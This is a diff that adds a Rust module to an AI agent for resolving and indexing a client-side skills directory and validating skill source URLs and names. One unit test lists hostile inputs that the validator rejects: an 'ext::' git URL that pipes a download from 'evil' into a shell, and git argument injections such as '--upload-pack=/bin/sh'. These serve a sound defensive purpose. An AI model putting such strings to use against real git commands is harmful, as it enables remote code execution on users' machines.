@@ -1,0 +1,397 @@
+//! Skills resolution and validation logic.
+//!
+//! The agent process itself never learns the path to an editor's skills
+//! checkout: one server can serve editors on different machines and
+//! operating systems, so the directory is resolved by a small shell script
+//! run *on the client* over ACP, not by anything this crate stores. This
+//! module owns that script's text (a compile-time constant with nothing
+//! interpolated into it — the candidate directories are environment
+//! expansions the client's own shell performs), the parser for its output,
+//! and the validators used by `skill_install`/`skill_uninstall`.
+
+use anyhow::{Context, Result, bail};
+
+// This module's whole public surface is unused until the `skill` /
+// `skill_install` / `skill_uninstall` ACP tools (a later task) call into
+// it — clippy's default (non-`--all-targets`) profile does not see the
+// `#[cfg(test)]` module below, so every item here reads as dead code to
+// it in the meantime. `#[allow(dead_code)]` on each item records that
+// this is expected, not a decision to drop coverage; every item is
+// exercised by the unit tests in this file's own `mod tests`.
+
+#[derive(Debug)]
+#[allow(dead_code)]
+pub struct SkillEntry {
+    pub name: String,
+    pub description: String,
+    pub path: String,
+}
+
+#[derive(Debug)]
+#[allow(dead_code)]
+pub struct SkillIndex {
+    pub dir: String,
+    pub skills: Vec<SkillEntry>,
+}
+
+/// Resolve the skills directory and index it, in one round trip.
+///
+/// The candidate order mirrors `directories::BaseDirs::data_dir()`,
+/// which `init_app_ctx` already uses for this crate's own directories
+/// on the server side. `-d` gates every candidate, so the list is safe
+/// to try in the same order on every platform: a macOS path simply
+/// does not exist on Linux.
+///
+/// Frontmatter is emitted raw, one `FM` line per line of it, and parsed
+/// by `serde_yaml` in `parse_index`. Parsing YAML in `sed` would break
+/// on the quoted descriptions superpowers actually ships.
+#[allow(dead_code)]
+pub const RESOLVE_AND_INDEX_SH: &str = r#"
+set -u
+for d in "${SAPPHIRE_AGENT_SKILLS_DIR:-}" \
+         "${APPDATA:-}/sapphire-agent/skills" \
+         "${HOME:-}/Library/Application Support/sapphire-agent/skills" \
+         "${XDG_DATA_HOME:-${HOME:-}/.local/share}/sapphire-agent/skills"
+do
+  case "$d" in ""|"/sapphire-agent/skills") continue ;; esac
+  [ -d "$d" ] || continue
+  printf 'SKILLS_DIR\t%s\n' "$d"
+  for f in "$d"/*/SKILL.md "$d"/*/skills/*/SKILL.md; do
+    [ -f "$f" ] || continue
+    printf 'SKILL\t%s\n' "$f"
+    awk 'NR==1 && $0=="---" {inside=1; next}
+         inside && $0=="---" {exit}
+         inside {print "FM\t" $0}' "$f"
+  done
+  exit 0
+done
+printf 'NO_SKILLS_DIR\n'
+"#;
+
+/// Resolve the skills directory for writing, creating it when absent.
+/// Used only by `skill_install`, which is the one operation allowed to
+/// bring the directory into existence.
+#[allow(dead_code)]
+pub const RESOLVE_OR_CREATE_SH: &str = r#"
+set -eu
+if [ -n "${SAPPHIRE_AGENT_SKILLS_DIR:-}" ]; then
+  d="$SAPPHIRE_AGENT_SKILLS_DIR"
+elif [ -n "${APPDATA:-}" ]; then
+  d="$APPDATA/sapphire-agent/skills"
+elif [ -d "${HOME:-}/Library/Application Support" ]; then
+  d="$HOME/Library/Application Support/sapphire-agent/skills"
+else
+  d="${XDG_DATA_HOME:-${HOME:-}/.local/share}/sapphire-agent/skills"
+fi
+mkdir -p "$d"
+printf 'SKILLS_DIR\t%s\n' "$d"
+"#;
+
+/// Parse the output of [`RESOLVE_AND_INDEX_SH`].
+#[allow(dead_code)]
+pub fn parse_index(stdout: &str) -> Result<SkillIndex> {
+    let mut dir: Option<String> = None;
+    let mut skills = Vec::new();
+    let mut current: Option<(String, Vec<String>)> = None;
+
+    // Flush whatever skill was being accumulated. A definition with no
+    // parseable `name` is skipped rather than fatal: one malformed file
+    // in someone's checkout must not remove every other skill, which is
+    // the same rule `load_agents_dir` follows.
+    fn flush(cur: Option<(String, Vec<String>)>, out: &mut Vec<SkillEntry>) {
+        let Some((path, fm_lines)) = cur else { return };
+        let fm = fm_lines.join("\n");
+        let map = crate::frontmatter::parse_mapping(&fm);
+        let get = |k: &str| map.get(k).and_then(|v| v.as_str()).map(str::to_string);
+        match get("name") {
+            Some(name) if !name.is_empty() => out.push(SkillEntry {
+                name,
+                description: get("description").unwrap_or_default(),
+                path,
+            }),
+            _ => tracing::warn!("skill at {path} has no usable `name`; skipping"),
+        }
+    }
+
+    for line in stdout.lines() {
+        if line == "NO_SKILLS_DIR" {
+            bail!(
+                "no skills directory found on the editor's machine. Tried \
+                 $SAPPHIRE_AGENT_SKILLS_DIR, $APPDATA/sapphire-agent/skills, \
+                 ~/Library/Application Support/sapphire-agent/skills and \
+                 ${{XDG_DATA_HOME:-~/.local/share}}/sapphire-agent/skills. \
+                 Use skill_install to create it and install a skill source, \
+                 or set SAPPHIRE_AGENT_SKILLS_DIR to an existing checkout."
+            );
+        }
+        if let Some(d) = line.strip_prefix("SKILLS_DIR\t") {
+            dir = Some(d.to_string());
+        } else if let Some(p) = line.strip_prefix("SKILL\t") {
+            flush(current.take(), &mut skills);
+            current = Some((p.to_string(), Vec::new()));
+        } else if let Some(fm) = line.strip_prefix("FM\t")
+            && let Some((_, lines)) = current.as_mut()
+        {
+            lines.push(fm.to_string());
+        }
+    }
+    flush(current.take(), &mut skills);
+
+    let dir = dir.context("resolver produced no SKILLS_DIR line")?;
+    skills.sort_by(|a, b| a.name.cmp(&b.name));
+    Ok(SkillIndex { dir, skills })
+}
+
+/// Parse the output of [`RESOLVE_OR_CREATE_SH`]: a single
+/// `SKILLS_DIR\t<path>` line. Errors if that line is absent.
+#[allow(dead_code)]
+pub fn parse_resolved_dir(stdout: &str) -> Result<String> {
+    stdout
+        .lines()
+        .find_map(|line| line.strip_prefix("SKILLS_DIR\t"))
+        .map(str::to_string)
+        .context("resolver produced no SKILLS_DIR line")
+}
+
+/// Reject everything but a plain `https://` source URL.
+///
+/// Checking the prefix positively — rather than deny-listing `ext::`,
+/// `file://`, `git://`, `ssh://`, and scp-like `user@host:path` one by
+/// one — means every one of those (and anything else not spelled
+/// `https://`) is excluded by the same clause instead of by an
+/// enumeration that could miss one. A leading `-` is rejected first so
+/// nothing here can be mistaken for a flag by whatever eventually runs
+/// `git clone` with this string.
+#[allow(dead_code)]
+pub fn validate_source_url(url: &str) -> Result<()> {
+    if url.is_empty() || url.starts_with('-') || !url.starts_with("https://") {
+        bail!("'{url}' is not an https:// source URL");
+    }
+    Ok(())
+}
+
+/// Derive a destination directory name from a source URL: the final
+/// non-empty path segment (after the `scheme://host` part), with a
+/// trailing `.git` stripped, validated as a skills-directory entry name.
+#[allow(dead_code)]
+pub fn destination_name(url: &str) -> Result<String> {
+    let after_scheme = url.split("://").nth(1).unwrap_or(url);
+    let path = after_scheme.split_once('/').map_or("", |(_, rest)| rest);
+    let segment = path
+        .split('/')
+        .rfind(|s| !s.is_empty())
+        .with_context(|| format!("'{url}' has no path segment to derive a name from"))?;
+    let name = segment.strip_suffix(".git").unwrap_or(segment);
+    validate_entry_name(name)?;
+    Ok(name.to_string())
+}
+
+/// Reserved DOS device names. See `DigestCache::RESERVED_WINDOWS_NAMES`
+/// (`src/digest_cache.rs`) for why this closed, decades-stable Win32 set
+/// needs its own check: `"CON"` is three ordinary ASCII letters, so an
+/// allow-listed charset alone does not exclude it.
+#[allow(dead_code)]
+const RESERVED_WINDOWS_NAMES: &[&str] = &[
+    "CON", "PRN", "AUX", "NUL", "COM1", "COM2", "COM3", "COM4", "COM5", "COM6", "COM7", "COM8",
+    "COM9", "LPT1", "LPT2", "LPT3", "LPT4", "LPT5", "LPT6", "LPT7", "LPT8", "LPT9",
+];
+
+/// Validate a single path component destined to be joined onto the
+/// skills directory (an installed source's directory name, or a skill
+/// name used to remove one). Matches `DigestCache::path_for`'s rule:
+/// allow-listed charset (closes traversal, absolute/drive-relative
+/// paths, and a leading `-` that some downstream command could read as
+/// a flag) plus a deny-list of the fixed reserved-device-name set,
+/// which the charset alone cannot exclude.
+#[allow(dead_code)]
+pub fn validate_entry_name(name: &str) -> Result<()> {
+    let reserved = RESERVED_WINDOWS_NAMES
+        .iter()
+        .any(|n| n.eq_ignore_ascii_case(name));
+    if name.is_empty()
+        || name == "."
+        || name == ".."
+        || name.starts_with('-')
+        || reserved
+        || !name
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_' || c == '.')
+    {
+        bail!("'{name}' is not usable as a skills directory entry");
+    }
+    Ok(())
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn the_index_parses_a_directory_and_both_layouts() {
+        let out = "SKILLS_DIR\t/home/u/.local/share/sapphire-agent/skills\n\
+                   SKILL\t/home/u/.local/share/sapphire-agent/skills/local-thing/SKILL.md\n\
+                   FM\tname: local-thing\n\
+                   FM\tdescription: a hand-written one\n\
+                   SKILL\t/home/u/.local/share/sapphire-agent/skills/superpowers/skills/brainstorming/SKILL.md\n\
+                   FM\tname: brainstorming\n\
+                   FM\tdescription: \"You MUST use this before any creative work\"\n";
+        let idx = parse_index(out).unwrap();
+        assert_eq!(idx.dir, "/home/u/.local/share/sapphire-agent/skills");
+        assert_eq!(idx.skills.len(), 2);
+        assert_eq!(idx.skills[0].name, "brainstorming");
+        // The quoted form must survive: superpowers quotes several
+        // descriptions, and a naive `split(": ")` would keep the quotes.
+        assert_eq!(
+            idx.skills[0].description,
+            "You MUST use this before any creative work"
+        );
+    }
+
+    #[test]
+    fn no_directory_is_a_distinct_error_not_an_empty_index() {
+        let err = parse_index("NO_SKILLS_DIR\n").unwrap_err().to_string();
+        assert!(err.contains("SAPPHIRE_AGENT_SKILLS_DIR"), "got: {err}");
+        assert!(err.contains("skill_install"), "got: {err}");
+    }
+
+    #[test]
+    fn a_skill_whose_frontmatter_lacks_a_name_is_skipped_not_fatal() {
+        let out = "SKILLS_DIR\t/s\n\
+                   SKILL\t/s/broken/SKILL.md\n\
+                   FM\tdescription: no name here\n\
+                   SKILL\t/s/ok/SKILL.md\n\
+                   FM\tname: ok\n\
+                   FM\tdescription: fine\n";
+        let idx = parse_index(out).unwrap();
+        assert_eq!(idx.skills.len(), 1);
+        assert_eq!(idx.skills[0].name, "ok");
+    }
+
+    #[test]
+    fn a_resolved_dir_is_parsed_from_a_single_line() {
+        let dir = parse_resolved_dir("SKILLS_DIR\t/home/u/.local/share/sapphire-agent/skills\n")
+            .unwrap();
+        assert_eq!(dir, "/home/u/.local/share/sapphire-agent/skills");
+    }
+
+    #[test]
+    fn a_missing_resolved_dir_line_is_an_error() {
+        assert!(parse_resolved_dir("").is_err());
+        assert!(parse_resolved_dir("NO_SKILLS_DIR\n").is_err());
+    }
+
+    #[test]
+    fn only_https_sources_are_accepted() {
+        assert!(validate_source_url("https://github.com/obra/superpowers").is_ok());
+        for bad in [
+            "ext::sh -c 'curl evil|sh'",
+            "file:///etc",
+            "git://github.com/x/y",
+            "ssh://git@github.com/x/y",
+            "git@github.com:x/y.git",
+            "--upload-pack=/bin/sh",
+            "-oProxyCommand=x",
+            "http://github.com/x/y",
+        ] {
+            assert!(validate_source_url(bad).is_err(), "accepted {bad}");
+        }
+    }
+
+    #[test]
+    fn destination_names_are_derived_and_sanitised() {
+        assert_eq!(
+            destination_name("https://github.com/obra/superpowers").unwrap(),
+            "superpowers"
+        );
+        assert_eq!(
+            destination_name("https://github.com/obra/superpowers.git").unwrap(),
+            "superpowers"
+        );
+        assert_eq!(
+            destination_name("https://github.com/obra/superpowers/").unwrap(),
+            "superpowers"
+        );
+        // `CON` is three ordinary ASCII letters, so an alphanumeric
+        // allow-list does not exclude it. Ruling that it did was wrong
+        // once already, during the client-side tools work.
+        assert!(destination_name("https://example.com/x/con").is_err());
+        assert!(destination_name("https://example.com/x/CON.git").is_err());
+        assert!(destination_name("https://example.com/x/..").is_err());
+        assert!(destination_name("https://example.com/").is_err());
+    }
+
+    #[test]
+    fn entry_names_cannot_escape_the_skills_directory() {
+        assert!(validate_entry_name("superpowers").is_ok());
+        for bad in ["..", ".", "", "a/b", "a\\b", "/abs", "-x", "nul", "COM1"] {
+            assert!(validate_entry_name(bad).is_err(), "accepted {bad}");
+        }
+    }
+
+    // ── Script fixture tests ────────────────────────────────────────────
+    //
+    // The scripts are shell running on someone else's machine, so
+    // asserting on Rust that never evaluates them proves nothing. Both
+    // tests return early where no `sh`/`bash` is on `PATH` — the
+    // assertion is about the script, not about the machine running the
+    // suite.
+
+    use std::process::Command;
+
+    fn sh() -> Option<&'static str> {
+        for c in ["sh", "bash"] {
+            if Command::new(c).arg("-c").arg("exit 0").status().is_ok() {
+                return Some(c);
+            }
+        }
+        None
+    }
+
+    #[test]
+    fn the_resolver_finds_both_layouts_under_the_env_override() {
+        let Some(sh) = sh() else { return };
+        let tmp = tempfile::tempdir().unwrap();
+        let skills = tmp.path().join("skills");
+        std::fs::create_dir_all(skills.join("local-thing")).unwrap();
+        std::fs::write(
+            skills.join("local-thing/SKILL.md"),
+            "---\nname: local-thing\ndescription: hand written\n---\n\nbody\n",
+        )
+        .unwrap();
+        std::fs::create_dir_all(skills.join("bundle/skills/brainstorming")).unwrap();
+        std::fs::write(
+            skills.join("bundle/skills/brainstorming/SKILL.md"),
+            "---\nname: brainstorming\ndescription: \"quoted one\"\n---\n\nbody\n",
+        )
+        .unwrap();
+
+        let out = Command::new(sh)
+            .arg("-c")
+            .arg(RESOLVE_AND_INDEX_SH)
+            .env("SAPPHIRE_AGENT_SKILLS_DIR", &skills)
+            .output()
+            .unwrap();
+        let stdout = String::from_utf8(out.stdout).unwrap();
+        let idx = parse_index(&stdout).unwrap();
+        assert_eq!(idx.skills.len(), 2, "stdout was:\n{stdout}");
+        assert_eq!(idx.skills[0].name, "brainstorming");
+        assert_eq!(idx.skills[0].description, "quoted one");
+        assert_eq!(idx.skills[1].name, "local-thing");
+    }
+
+    #[test]
+    fn the_resolver_reports_absence_rather_than_guessing() {
+        let Some(sh) = sh() else { return };
+        let tmp = tempfile::tempdir().unwrap();
+        let out = Command::new(sh)
+            .arg("-c")
+            .arg(RESOLVE_AND_INDEX_SH)
+            .env("SAPPHIRE_AGENT_SKILLS_DIR", tmp.path().join("nope"))
+            .env_remove("APPDATA")
+            .env("HOME", tmp.path())
+            .env("XDG_DATA_HOME", tmp.path().join("xdg"))
+            .output()
+            .unwrap();
+        assert_eq!(String::from_utf8(out.stdout).unwrap().trim(), "NO_SKILLS_DIR");
+    }
+}
